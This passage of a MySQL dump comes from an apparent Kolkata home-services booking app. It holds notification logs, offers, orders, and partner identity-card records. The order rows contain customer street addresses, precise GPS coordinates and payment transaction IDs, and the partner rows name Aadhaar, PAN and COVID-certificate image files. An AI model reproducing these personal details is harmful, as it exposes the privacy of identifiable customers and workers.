(69, 30, '2021-12-10 14:40:18', 'Order successfully created', 'You have successfully created order.'),
(70, 14, '2021-12-10 15:06:38', 'Order successfully created', 'You have successfully created order.'),
(71, 14, '2021-12-10 15:16:33', 'Order successfully created', 'You have successfully created order.'),
(72, 23, '2021-12-10 16:38:07', 'Order successfully created', 'You have successfully created order.'),
(73, 14, '2021-12-10 16:43:07', 'Order successfully created', 'You have successfully created order.'),
(74, 14, '2021-12-10 17:02:28', 'Order successfully created', 'You have successfully created order.'),
(75, 14, '2021-12-10 17:11:51', 'Order successfully created', 'You have successfully created order.'),
(76, 23, '2021-12-10 17:20:28', 'Order successfully created', 'You have successfully created order.'),
(77, 14, '2021-12-10 18:41:06', 'Order successfully created', 'You have successfully created order.'),
(78, 14, '2021-12-10 18:57:06', 'Order successfully created', 'You have successfully created order.'),
(79, 23, '2021-12-10 18:59:01', 'Order successfully created', 'You have successfully created order.'),
(80, 14, '2021-12-10 19:04:16', 'Order successfully created', 'You have successfully created order.'),
(81, 14, '2021-12-10 19:06:12', 'Order successfully created', 'You have successfully created order.'),
(82, 14, '2021-12-10 19:06:48', 'Order accepted', 'Order accepted.Order id: 108'),
(83, 14, '2021-12-10 19:06:58', 'Order completed', 'Order completed.Order id: 108'),
(84, 14, '2021-12-10 19:28:53', 'Order successfully created', 'You have successfully created order.'),
(85, 14, '2021-12-10 19:30:09', 'Order successfully created', 'You have successfully created order.'),
(86, 23, '2021-12-10 19:38:41', 'Order successfully created', 'You have successfully created order.'),
(87, 23, '2021-12-10 19:42:52', 'Order successfully created', 'You have successfully created order.'),
(88, 23, '2021-12-10 20:28:37', 'Order successfully created', 'You have successfully created order.'),
(89, 23, '2021-12-10 20:30:56', 'Order successfully created', 'You have successfully created order.'),
(90, 25, '2021-12-11 06:47:26', 'Order successfully cancelled', 'You have successfully cancelled order.Order id: 115'),
(91, 23, '2021-12-11 16:53:08', 'Order successfully created', 'You have successfully created order.Order id : 117'),
(92, 23, '2021-12-11 16:56:26', 'Order successfully created', 'You have successfully created order.Order id : 118'),
(93, 23, '2021-12-11 16:56:44', 'Order accepted', 'Order accepted.Order id: 118'),
(94, 23, '2021-12-11 17:09:00', 'Order successfully created', 'You have successfully created order.Order id : 119'),
(95, 23, '2021-12-11 17:17:57', 'Order successfully created', 'You have successfully created order.Order id : 120'),
(96, 23, '2021-12-11 17:23:33', 'Order successfully created', 'You have successfully created order.Order id : 121'),
(97, 23, '2021-12-11 17:26:24', 'Order successfully created', 'You have successfully created order.Order id : 122'),
(98, 23, '2021-12-11 17:31:56', 'Order successfully created', 'You have successfully created order.Order id : 123'),
(99, 23, '2021-12-11 17:38:52', 'Order successfully created', 'You have successfully created order.Order id : 124'),
(100, 23, '2021-12-11 17:43:14', 'Order successfully created', 'You have successfully created order.Order id : 125'),
(101, 14, '2021-12-12 06:25:29', 'Order successfully created', 'You have successfully created order.Order id : 126'),
(102, 14, '2021-12-12 06:28:06', 'Order completed', 'Order completed.Order id: 126'),
(103, 23, '2021-12-12 06:29:33', 'Hi', 'test'),
(104, 23, '2021-12-12 06:45:40', 'Hi', 'test'),
(105, 25, '2021-12-12 06:59:22', 'Order successfully created', 'You have successfully created order.Order id : 127'),
(106, 25, '2021-12-12 07:02:00', 'Order accepted', 'Order accepted.Order id: 127'),
(107, 25, '2021-12-12 07:04:28', 'Order completed', 'Order completed.Order id: 127'),
(108, 23, '2021-12-12 07:37:13', 'Hi', 'test'),
(109, 23, '2021-12-12 07:43:35', 'Hi', 'test'),
(110, 23, '2021-12-12 07:50:02', 'Hi', 'test'),
(111, 23, '2021-12-12 07:51:27', 'Hi', 'test'),
(112, 23, '2021-12-12 07:53:33', 'Hi', 'test'),
(113, 23, '2021-12-12 08:00:05', 'Hi', 'test'),
(114, 22, '2021-12-12 15:21:01', 'Nur test', 'Hi test'),
(115, 17, '2021-12-12 15:25:23', 'Nur test', 'Hi test'),
(116, 17, '2021-12-12 15:26:46', 'Nur test', 'Hi test'),
(117, 17, '2021-12-12 15:28:13', 'Nur test', 'Hi test'),
(118, 17, '2021-12-12 15:30:12', 'Nur test1', 'Hi test'),
(119, 17, '2021-12-12 15:32:49', 'Nur test1', 'Hi test'),
(120, 17, '2021-12-12 15:34:38', 'Nur test1', 'Hi test'),
(121, 17, '2021-12-12 15:45:23', 'Nur test1', 'Hi test'),
(122, 17, '2021-12-12 15:54:52', 'Nur test1', 'Hi test'),
(123, 17, '2021-12-12 15:56:39', 'Nur test1', 'Hi test'),
(124, 17, '2021-12-12 16:02:40', 'Nur test1', 'Hi test'),
(125, 17, '2021-12-12 16:15:09', 'Nur test1', 'Hi test'),
(126, 17, '2021-12-12 16:17:16', 'Nur test1', 'Hi test'),
(127, 17, '2021-12-12 16:17:30', 'Nur test1', 'Hi test'),
(128, 17, '2021-12-12 16:19:48', 'Nur test1', 'Hi test'),
(129, 17, '2021-12-12 16:20:27', 'Nur test1', 'Hi test'),
(130, 17, '2021-12-12 16:25:50', 'Nur test1', 'Hi test'),
(131, 17, '2021-12-12 17:33:35', 'Nur test1', 'Hi test'),
(132, 17, '2021-12-12 17:43:25', 'Nur test1', 'Hi test'),
(133, 17, '2021-12-12 17:46:51', 'Nur test1', 'Hi test'),
(134, 17, '2021-12-12 17:48:28', 'Nur test1', 'Hi test'),
(135, 17, '2021-12-12 18:01:39', 'Nur test1', 'Hi test'),
(136, 17, '2021-12-12 18:05:58', 'Nur test1', 'Hi test'),
(137, 17, '2021-12-12 18:06:43', 'Nur test1', 'Hi test'),
(138, 17, '2021-12-12 18:16:22', 'Nur test1', 'Hi test'),
(139, 17, '2021-12-12 18:33:35', 'Nur test1', 'Hi test'),
(140, 17, '2021-12-12 18:33:58', 'Nur test1', 'Hi test'),
(141, 23, '2021-12-12 20:35:27', 'Hi', 'test'),
(142, 23, '2021-12-12 20:36:13', 'Hi', 'new test'),
(143, 23, '2021-12-12 20:41:13', 'Hi', 'new test'),
(144, 23, '2021-12-12 20:49:20', 'Hi', 'new test'),
(145, 23, '2021-12-12 20:50:12', 'Order successfully created', 'You have successfully created order.Order id : 128'),
(146, 23, '2021-12-12 20:51:01', 'Order successfully created', 'You have successfully created order.Order id : 129'),
(147, 23, '2021-12-12 21:08:53', 'Hi', 'new test'),
(148, 23, '2021-12-12 21:09:25', 'Order successfully created', 'You have successfully created order.Order id : 130'),
(149, 23, '2021-12-12 21:54:01', 'Hi', 'new test'),
(150, 23, '2021-12-12 22:03:29', 'Order successfully created', 'You have successfully created order.Order id : 131'),
(151, 14, '2021-12-13 05:07:07', 'Order successfully created', 'You have successfully created order.Order id : 132'),
(152, 14, '2021-12-13 05:07:48', 'Order accepted', 'Order accepted.Order id: 132'),
(153, 14, '2021-12-13 05:08:13', 'Order completed', 'Order completed.Order id: 132'),
(154, 14, '2021-12-13 05:23:51', 'Order successfully created', 'You have successfully created order.Order id : 133'),
(155, 14, '2021-12-13 05:24:15', 'Order accepted', 'Order accepted.Order id: 133'),
(156, 14, '2021-12-13 05:27:31', 'Order completed', 'Order completed.Order id: 133'),
(157, 14, '2021-12-13 05:37:29', 'Order successfully created', 'You have successfully created order.Order id : 134'),
(158, 14, '2021-12-13 05:37:52', 'Order accepted', 'Order accepted.Order id: 134'),
(159, 14, '2021-12-13 05:37:59', 'Order completed', 'Order completed.Order id: 134'),
(160, 23, '2021-12-13 05:44:55', 'Order successfully created', 'You have successfully created order.Order id : 135'),
(161, 23, '2021-12-13 05:45:33', 'Order accepted', 'Order accepted.Order id: 135'),
(162, 23, '2021-12-13 05:46:41', 'Order completed', 'Order completed.Order id: 135'),
(163, 14, '2021-12-13 06:10:03', 'Order successfully created', 'You have successfully created order.Order id : 138'),
(164, 14, '2021-12-13 06:10:34', 'Order accepted', 'Order accepted.Order id: 138'),
(165, 14, '2021-12-13 06:10:41', 'Order completed', 'Order completed.Order id: 138'),
(166, 14, '2021-12-13 06:24:55', 'Order successfully created', 'You have successfully created order.Order id : 140'),
(167, 14, '2021-12-13 06:25:18', 'Order accepted', 'Order accepted.Order id: 140'),
(168, 14, '2021-12-13 06:25:27', 'Order completed', 'Order completed.Order id: 140'),
(169, 14, '2021-12-13 06:38:32', 'Order successfully created', 'You have successfully created order.Order id : 141'),
(170, 14, '2021-12-13 06:39:02', 'Order accepted', 'Order accepted.Order id: 141'),
(171, 14, '2021-12-13 06:39:08', 'Order completed', 'Order completed.Order id: 141'),
(172, 17, '2021-12-13 07:57:31', 'Nur test1', 'Hi test'),
(173, 17, '2021-12-13 08:01:17', 'Nur test1', 'Hi test'),
(174, 17, '2021-12-13 08:35:30', 'Nur test1', 'Hi test'),
(175, 17, '2021-12-13 08:40:14', 'Nur test1', 'Hi test'),
(176, 17, '2021-12-13 08:40:55', 'Nur test1', 'Hi test'),
(177, 17, '2021-12-13 08:46:46', 'Nur test1', 'Hi test'),
(178, 17, '2021-12-13 08:50:13', 'Nur test1', 'Hi test'),
(179, 17, '2021-12-13 08:51:17', 'Nur test1', 'Hi test'),
(180, 33, '2021-12-13 09:00:39', 'Order completed', 'Order completed.Order id: 144'),
(181, 17, '2021-12-13 09:04:28', 'Nur test1', 'Hi test'),
(182, 17, '2021-12-13 09:04:36', 'Nur test1', 'Hi test'),
(183, 17, '2021-12-13 09:06:06', 'Nur test1', 'Hi test'),
(184, 17, '2021-12-13 09:19:49', 'Nur test1', 'Hi test'),
(185, 17, '2021-12-13 09:22:01', 'Nur test1', 'Hi test'),
(186, 23, '2021-12-13 10:20:50', 'Order successfully created', 'You have successfully created order.Order id : 145'),
(187, 23, '2021-12-13 10:52:33', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(188, 23, '2021-12-13 10:54:14', 'Order accepted', 'Order accepted.Order id: 1'),
(189, 23, '2021-12-13 10:54:35', 'Order completed', 'Order completed.Order id: 1'),
(190, 17, '2021-12-13 14:18:24', 'Nur test1', 'Hi test'),
(191, 14, '2021-12-13 15:45:01', 'Order successfully created', 'You have successfully created order.'),
(192, 14, '2021-12-13 15:45:49', 'Order successfully created', 'You have successfully created order.'),
(193, 14, '2021-12-13 15:46:18', 'Order successfully created', 'You have successfully created order.'),
(194, 14, '2021-12-13 15:51:05', 'Order accepted', 'Order accepted.Order id: 3'),
(195, 14, '2021-12-13 15:51:12', 'Order completed', 'Order completed.Order id: 3'),
(196, 14, '2021-12-13 15:55:45', 'Order successfully created', 'You have successfully created order.Order id : 6'),
(197, 14, '2021-12-13 15:56:56', 'Order accepted', 'Order accepted.Order id: 6'),
(198, 14, '2021-12-13 15:57:34', 'Order completed', 'Order completed.Order id: 6'),
(199, 14, '2021-12-13 17:22:10', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(200, 14, '2021-12-13 17:23:54', 'Order accepted', 'Order accepted.Order id: 1'),
(201, 14, '2021-12-13 17:24:38', 'Order completed', 'Order completed.Order id: 1'),
(202, 19, '2021-12-14 05:24:06', 'Order successfully created', 'You have successfully created order.Order id : 2'),
(203, 19, '2021-12-14 05:25:42', 'Order accepted', 'Order accepted.Order id: 2'),
(204, 19, '2021-12-14 05:25:56', 'Order completed', 'Order completed.Order id: 2'),
(205, 17, '2021-12-14 17:19:57', 'Nur test1', 'Hi test'),
(206, 17, '2021-12-14 17:23:02', 'Nur test1', 'Hi test'),
(207, 17, '2021-12-14 17:24:39', 'Nur test1', 'Hi test'),
(208, 17, '2021-12-14 17:25:40', 'Nur test1', 'Hi test'),
(209, 17, '2021-12-14 17:27:31', 'Nur test1', 'Hi test'),
(210, 17, '2021-12-14 17:27:38', 'Nur test1', 'Hi test'),
(211, 17, '2021-12-14 17:29:40', 'Nur test1', 'Hi test'),
(212, 17, '2021-12-14 17:32:18', 'Nur test1', 'Hi test'),
(213, 17, '2021-12-14 17:33:10', 'Nur test1', 'Hi test'),
(214, 17, '2021-12-14 17:42:50', 'Nur test1', 'Hi test'),
(215, 17, '2021-12-14 17:43:25', 'Nur test1', 'Hi test'),
(216, 17, '2021-12-14 17:54:38', 'Nur test1', 'Hi test'),
(217, 17, '2021-12-14 18:06:19', 'Nur test1', 'Hi test'),
(218, 17, '2021-12-14 18:08:18', 'Nur test1', 'Hi test'),
(219, 17, '2021-12-14 18:10:48', 'Nur test1', 'Hi test'),
(220, 14, '2021-12-15 15:00:46', 'Order successfully created', 'You have successfully created order.Order id : 4'),
(221, 14, '2021-12-15 15:01:35', 'Order accepted', 'Order accepted.Order id: 4'),
(222, 14, '2021-12-15 15:02:02', 'Order completed', 'Order completed.Order id: 4'),
(223, 34, '2021-12-15 16:59:53', 'Order successfully created', 'You have successfully created order.Order id : 5'),
(224, 34, '2021-12-15 17:21:40', 'Order accepted', 'Order accepted.Order id: 5'),
(225, 34, '2021-12-15 17:23:57', 'Order completed', 'Order completed.Order id: 5'),
(226, 27, '2021-12-15 17:24:35', 'Order completed', 'Order completed.Order id: 3'),
(227, 27, '2021-12-15 17:34:20', 'Order completed', 'Order completed.Order id: 3'),
(228, 27, '2021-12-15 17:35:33', 'Order completed', 'Order completed.Order id: 3'),
(229, 14, '2021-12-15 17:37:59', 'Order successfully created', 'You have successfully created order.Order id : 6'),
(230, 14, '2021-12-15 17:38:15', 'Order accepted', 'Order accepted.Order id: 6'),
(231, 14, '2021-12-15 17:38:23', 'Order completed', 'Order completed.Order id: 6'),
(232, 14, '2021-12-15 17:51:36', 'Order successfully created', 'You have successfully created order.Order id : 7'),
(233, 14, '2021-12-15 17:52:26', 'Order accepted', 'Order accepted.Order id: 7'),
(234, 14, '2021-12-15 17:58:23', 'Order completed', 'Order completed.Order id: 7'),
(235, 33, '2021-12-16 06:37:52', 'Order successfully created', 'You have successfully created order.Order id : 8'),
(236, 33, '2021-12-16 06:38:08', 'Order accepted', 'Order accepted.Order id: 8'),
(237, 33, '2021-12-16 06:41:07', 'Order completed', 'Order completed.Order id: 8'),
(238, 33, '2021-12-16 06:52:39', 'Order successfully created', 'You have successfully created order.Order id : 9'),
(239, 33, '2021-12-16 06:53:45', 'Order successfully created', 'You have successfully created order.Order id : 10'),
(240, 33, '2021-12-16 06:53:50', 'Order accepted', 'Order accepted.Order id: 10'),
(241, 33, '2021-12-16 07:00:10', 'Order completed', 'Order completed.Order id: 10'),
(242, 25, '2021-12-16 07:52:07', 'Order successfully created', 'You have successfully created order.Order id : 11'),
(243, 25, '2021-12-16 08:00:29', 'Order successfully created', 'You have successfully created order.Order id : 14'),
(244, 25, '2021-12-16 08:02:26', 'Order completed', 'Order completed.Order id: 13'),
(245, 25, '2021-12-16 11:30:43', 'Order successfully created', 'You have successfully created order.Order id : 15'),
(246, 14, '2021-12-17 00:36:16', 'Order successfully created', 'You have successfully created order.Order id : 16'),
(247, 23, '2021-12-17 05:24:20', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(248, 23, '2021-12-17 05:58:41', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(249, 23, '2021-12-17 06:16:50', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(250, 23, '2021-12-17 06:18:46', 'Order accepted', 'Order accepted.Order id: 1'),
(251, 23, '2021-12-17 06:19:04', 'Order completed', 'Order completed.Order id: 1'),
(252, 25, '2021-12-17 11:23:09', 'Order cancelled', 'Order cancelled.Order id: 2'),
(253, 25, '2021-12-17 11:23:32', 'Order cancelled', 'Order cancelled.Order id: 3'),
(254, 25, '2021-12-17 11:28:37', 'Order completed', 'Order completed.Order id: 5'),
(255, 14, '2021-12-18 05:19:48', 'Order accepted', 'Order accepted.Order id: 7'),
(256, 14, '2021-12-18 05:19:55', 'Order completed', 'Order completed.Order id: 7'),
(257, 23, '2021-12-18 05:47:18', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(258, 23, '2021-12-18 05:48:03', 'Order successfully created', 'You have successfully created order.Order id : 2'),
(259, 23, '2021-12-18 05:49:48', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(260, 23, '2021-12-18 05:50:24', 'Order accepted', 'Order accepted.Order id: 1'),
(261, 23, '2021-12-18 05:52:25', 'Order completed', 'Order completed.Order id: 1'),
(262, 23, '2021-12-18 06:20:41', 'Order successfully created', 'You have successfully created order.Order id : 2'),
(263, 23, '2021-12-18 06:21:06', 'Order accepted', 'Order accepted.Order id: 2'),
(264, 23, '2021-12-18 06:21:12', 'Order completed', 'Order completed.Order id: 2'),
(265, 34, '2021-12-20 06:16:19', 'Order successfully created', 'You have successfully created order.Order id : 3'),
(266, 14, '2021-12-20 07:31:10', 'Order successfully created', 'You have successfully created order.Order id : 4'),
(267, 14, '2021-12-20 07:32:06', 'Order accepted', 'Order accepted.Order id: 4'),
(268, 14, '2021-12-20 07:33:09', 'Order completed', 'Order completed.Order id: 4'),
(269, 25, '2021-12-20 12:18:55', 'Order successfully created', 'You have successfully created order.Order id : 7'),
(270, 25, '2021-12-20 12:22:13', 'Order successfully created', 'You have successfully created order.Order id : 9'),
(271, 14, '2021-12-21 06:33:40', 'Order successfully created', 'You have successfully created order.Order id : 11'),
(272, 14, '2021-12-21 06:33:53', 'Order accepted', 'Order accepted.Order id: 11'),
(273, 14, '2021-12-21 06:34:00', 'Order completed', 'Order completed.Order id: 11'),
(274, 23, '2021-12-22 05:40:20', 'Order successfully created', 'You have successfully created order.Order id : 12'),
(275, 23, '2021-12-22 05:51:31', 'Payment done', 'You have successfully done your payment.Transaction id : pay_IaPZxTliUR931l'),
(276, 23, '2021-12-22 05:51:33', 'Order successfully created', 'You have successfully created order.Order id : 13'),
(277, 23, '2021-12-22 05:54:37', 'Payment done', 'You have successfully done your payment.Transaction id : pay_IaPdBvnIywXHKR'),
(278, 23, '2021-12-22 05:54:41', 'Order successfully created', 'You have successfully created order.Order id : 14'),
(279, 23, '2021-12-22 06:19:50', 'Payment done', 'You have successfully done your payment.Transaction id : pay_IaQ3tkU724hlqy'),
(280, 23, '2021-12-22 06:31:41', 'Order successfully created', 'You have successfully created order.Order id : 15'),
(281, 14, '2021-12-22 07:30:24', 'Order successfully created', 'You have successfully created order.Order id : 16'),
(282, 23, '2021-12-22 08:09:41', 'Order successfully created', 'You have successfully created order.Order id : 17'),
(283, 34, '2021-12-22 12:48:27', 'Order successfully created', 'You have successfully created order.Order id : 21'),
(284, 34, '2021-12-22 12:49:11', 'Order successfully created', 'You have successfully created order.Order id : 22'),
(285, 34, '2021-12-22 12:49:18', 'Order accepted', 'Order accepted.Order id: 21'),
(286, 34, '2021-12-22 12:57:28', 'Order accepted', 'Order accepted.Order id: 22'),
(287, 23, '2021-12-22 15:13:31', 'Order successfully created', 'You have successfully created order.Order id : 27'),
(288, 23, '2021-12-22 15:30:37', 'Order successfully created', 'You have successfully created order.Order id : 28'),
(289, 14, '2021-12-22 20:28:37', 'Order successfully created', 'You have successfully created order.Order id : 29'),
(290, 14, '2021-12-22 20:41:46', 'Order successfully created', 'You have successfully created order.Order id : 30'),
(291, 23, '2021-12-23 03:44:09', 'Order successfully created', 'You have successfully created order.Order id : 31'),
(292, 14, '2021-12-23 07:06:30', 'Order successfully created', 'You have successfully created order.Order id : 32'),
(293, 14, '2021-12-23 08:28:05', 'Order successfully created', 'You have successfully created order.Order id : 33'),
(294, 23, '2021-12-23 08:56:11', 'Order successfully created', 'You have successfully created order.Order id : 34'),
(295, 14, '2021-12-23 09:29:18', 'Order successfully created', 'You have successfully created order.Order id : 35'),
(296, 25, '2021-12-23 14:14:53', 'Order successfully created', 'You have successfully created order.Order id : 37'),
(297, 25, '2021-12-23 14:21:47', 'Order successfully created', 'You have successfully created order.Order id : 40'),
(298, 14, '2021-12-23 14:28:17', 'Order successfully created', 'You have successfully created order.Order id : 41'),
(299, 25, '2021-12-23 14:28:56', 'Order successfully created', 'You have successfully created order.Order id : 42'),
(300, 34, '2021-12-24 04:19:04', 'Order cancelled', 'Order cancelled.Order id: 22'),
(301, 34, '2021-12-24 04:19:24', 'Order cancelled', 'Order cancelled.Order id: 21'),
(302, 25, '2021-12-24 04:19:34', 'Order cancelled', 'Order cancelled.Order id: 6'),
(303, 25, '2021-12-24 04:19:39', 'Order cancelled', 'Order cancelled.Order id: 5'),
(304, 25, '2021-12-24 05:43:19', 'Order accepted', 'Order accepted.Order id: 42'),
(305, 14, '2021-12-24 05:43:34', 'Order accepted', 'Order accepted.Order id: 41'),
(306, 14, '2021-12-24 05:43:42', 'Order completed', 'Order completed.Order id: 41'),
(307, 14, '2021-12-24 05:47:24', 'Order accepted', 'Order accepted.Order id: 41'),
(308, 14, '2021-12-24 05:47:33', 'Order completed', 'Order completed.Order id: 41'),
(309, 25, '2021-12-24 05:47:51', 'Order completed', 'Order completed.Order id: 42'),
(310, 25, '2021-12-24 07:38:56', 'Order accepted', 'Order accepted.Order id: 7'),
(311, 23, '2021-12-24 07:39:47', 'Order accepted', 'Order accepted.Order id: 13'),
(312, 23, '2021-12-24 07:39:58', 'Order cancelled', 'Order cancelled.Order id: 13'),
(313, 25, '2021-12-24 07:50:07', 'Order cancelled', 'Order cancelled.Order id: 7'),
(314, 25, '2021-12-24 11:57:05', 'Order successfully created', 'You have successfully created order.Order id : 47'),
(315, 23, '2021-12-24 21:21:19', 'Order successfully created', 'You have successfully created order.Order id : 1'),
(316, 23, '2021-12-24 21:24:25', 'Order accepted', 'Order accepted.Order id: 1'),
(317, 14, '2021-12-25 03:45:19', 'Order successfully created', 'You have successfully created order.Order id : 2'),
(318, 14, '2021-12-25 04:01:12', 'Order successfully created', 'You have successfully created order.Order id : 4'),
(319, 14, '2021-12-25 04:42:56', 'Order accepted', 'Order accepted.Order id: 4'),
(320, 14, '2021-12-25 05:17:46', 'Order completed', 'Order completed.Order id: 3'),
(321, 23, '2021-12-26 06:26:33', 'Order successfully created', 'You have successfully created order.Order id : 7'),
(322, 14, '2021-12-26 08:29:31', 'Order cancelled', 'Order cancelled.Order id: 4'),
(323, 23, '2021-12-26 23:24:28', 'Order successfully created', 'You have successfully created order.Order id : 7'),
(324, 23, '2021-12-27 06:53:17', 'Order successfully created', 'You have successfully created order.Order id : 8'),
(325, 23, '2021-12-27 07:01:56', 'Order successfully created', 'You have successfully created order.Order id : 10'),
(326, 23, '2021-12-27 18:24:16', 'Order successfully created', 'You have successfully created order.Order id : 16'),
(327, 25, '2022-01-06 11:50:19', 'Order successfully created', 'You have successfully created order.Order id : 17'),
(328, 25, '2022-01-06 11:54:19', 'Order successfully created', 'You have successfully created order.Order id : 18'),
(329, 26, '2022-01-06 12:00:57', 'Order successfully created', 'You have successfully created order.Order id : 19'),
(330, 25, '2022-01-06 12:28:47', 'Order successfully created', 'You have successfully created order.Order id : 20'),
(331, 25, '2022-01-06 12:30:12', 'Order successfully created', 'You have successfully created order.Order id : 21'),
(332, 25, '2022-01-06 12:42:43', 'Order successfully created', 'You have successfully created order.Order id : 22'),
(333, 25, '2022-01-06 12:43:14', 'Order successfully created', 'You have successfully created order.Order id : 23'),
(334, 25, '2022-01-07 07:38:28', 'Order successfully created', 'You have successfully created order.Order id : 24'),
(335, 25, '2022-01-07 07:39:21', 'Order accepted', 'Order accepted.Order id: 24'),
(336, 25, '2022-01-07 07:39:44', 'Order completed', 'Order completed.Order id: 24');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_offer`
--

CREATE TABLE `tbl_offer` (
  `id` int(11) NOT NULL,
  `cid` int(11) NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `img` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `video` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_offer`
--

INSERT INTO `tbl_offer` (`id`, `cid`, `name`, `img`, `video`, `description`, `status`) VALUES
(1, 14, 'New Service', 'http://admin.dudeanddamsels.com/assets/images/img/1638330962Screenshot_2021-12-01_at_9_23_04_AM.png', '', 'All new services', 0),
(4, 14, 'Offer 2', 'http://admin.dudeanddamsels.com/assets/images/img/16383332174.png', '', 'offer 20%', 0),
(5, 14, 'test', 'http://admin.dudeanddamsels.com/assets/images/img/1638395218DANDD4.jpg', '', 's', 1);

-- --------------------------------------------------------

--
-- Table structure for table `tbl_order`
--

CREATE TABLE `tbl_order` (
  `id` int(11) NOT NULL,
  `checkout_id` int(11) DEFAULT NULL,
  `uid` int(11) DEFAULT NULL,
  `cid` int(11) DEFAULT NULL,
  `odate` date DEFAULT NULL,
  `otime` varchar(225) DEFAULT NULL,
  `p_method_id` int(11) DEFAULT NULL,
  `transaction_id` text DEFAULT NULL,
  `address` text NOT NULL,
  `o_total` double DEFAULT NULL,
  `o_tax` double DEFAULT NULL,
  `subtotal` double DEFAULT NULL,
  `p_total` double DEFAULT NULL,
  `c_total` double DEFAULT NULL,
  `trans_id` text DEFAULT NULL,
  `o_status` enum('Pending','Completed','Cancelled','Confirmed') NOT NULL DEFAULT 'Pending',
  `a_status` int(11) NOT NULL DEFAULT 0,
  `comment_reject` text DEFAULT NULL,
  `add_on` text DEFAULT NULL,
  `add_per_price` text DEFAULT NULL,
  `total_pay` double DEFAULT NULL,
  `lats` text NOT NULL,
  `longs` text NOT NULL,
  `rating` double NOT NULL DEFAULT 0,
  `datetime` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `tbl_order`
--

INSERT INTO `tbl_order` (`id`, `checkout_id`, `uid`, `cid`, `odate`, `otime`, `p_method_id`, `transaction_id`, `address`, `o_total`, `o_tax`, `subtotal`, `p_total`, `c_total`, `trans_id`, `o_status`, `a_status`, `comment_reject`, `add_on`, `add_per_price`, `total_pay`, `lats`, `longs`, `rating`, `datetime`) VALUES
(17, 26, 25, 14, '2022-01-07', '7:00', 2, NULL, 'P/30, Ballygunge, Kolkata, West Bengal 700029, India', 998, 199.6, 998, 798.4, 199.6, NULL, 'Cancelled', 0, NULL, '', '[]', NULL, '22.5166603', '88.3570075', 0, '2022-01-06 11:50:18'),
(18, 28, 25, 14, '2022-01-07', '8:30', 2, NULL, 'P/30, Ballygunge, Kolkata, West Bengal 700029, India', 998, 199.6, 998, 798.4, 199.6, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.5166637', '88.3570067', 0, '2022-01-06 11:54:17'),
(19, 30, 26, 14, '2022-01-07', '10:00', 2, NULL, '84A, Jatin Das Road, Ballygunge, Kolkata, WB 700029, India', 3000, 600, 3000, 2400, 600, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.516569266776838', '88.35700522517222', 0, '2022-01-06 12:00:55'),
(20, 33, 25, 14, '2022-01-07', '7:00', 2, NULL, 'P/30, Ballygunge, Kolkata, West Bengal 700029, India', 1497, 299.4, 1497, 1197.6, 299.4, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.5166617', '88.3570031', 0, '2022-01-06 12:28:46'),
(21, 34, 25, 14, '2022-01-07', '7:00', 2, NULL, 'P/30, Ballygunge, Kolkata, West Bengal 700029, India', 1497, 299.4, 1497, 1197.6, 299.4, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.5166612', '88.3570046', 0, '2022-01-06 12:30:11'),
(22, 35, 25, 21, '2022-01-07', '10:00', 2, NULL, 'Rabindra Sarobar Lake, , Kolkata, West Bengal 700045, India', 1600, 320, 1600, 1280, 320, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.5130282', '88.3537408', 0, '2022-01-06 12:42:43'),
(23, 36, 25, 21, '2022-01-07', '11:00', 2, NULL, 'Rabindra Sarobar Lake, , Kolkata, West Bengal 700045, India', 1600, 320, 1600, 1280, 320, NULL, 'Pending', 0, NULL, '', '[]', NULL, '22.5130468', '88.3536913', 0, '2022-01-06 12:43:13'),
(24, 37, 25, 14, '2022-01-08', '9:30', 2, NULL, 'P/30, Ballygunge, Kolkata, West Bengal 700029, India', 1497, 299.4, 1497, 1197.6, 299.4, NULL, 'Completed', 0, NULL, '', '[]', NULL, '22.516662', '88.3570037', 0, '2022-01-07 07:38:25');

-- --------------------------------------------------------

--
-- Table structure for table `tbl_order_product`
--

CREATE TABLE `tbl_order_product` (
  `id` int(11) NOT NULL,
  `oid` int(11) NOT NULL,
  `pquantity` int(11) NOT NULL,
  `ptitle` text NOT NULL,
  `pdiscount` int(11) NOT NULL,
  `pprice` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tbl_partner_cards`
--

CREATE TABLE `tbl_partner_cards` (
  `id` int(11) NOT NULL,
  `pid` int(11) DEFAULT NULL,
  `aadhar_card` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `pan_card` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `covid_certificate` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `count` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `tbl_partner_cards`
--

INSERT INTO `tbl_partner_cards` (`id`, `pid`, `aadhar_card`, `pan_card`, `covid_certificate`, `count`) VALUES
(5, 2, '1637367255image_picker256446941512495843.jpg', '1637428346image_picker2979447711150450173.jpg', '1637428362image_picker7102218468558504922.jpg', 3),
(6, 4, '1637428331image_picker3253940176880807094.jpg', '1637428346image_picker2979447711150450173.jpg', '1637428362image_picker7102218468558504922.jpg', 3),
(7, 11, '1637532197image_picker1262356046110466224.jpg', '1637532211image_picker983017436282649704.jpg', '1637532237image_picker683565527906803806.png', 3),
(8, 13, '1638340465image_picker307142500589558706.png', '1638340471image_picker8158329233983450635.png', '1638340476image_picker3580876296368434454.png', 3),
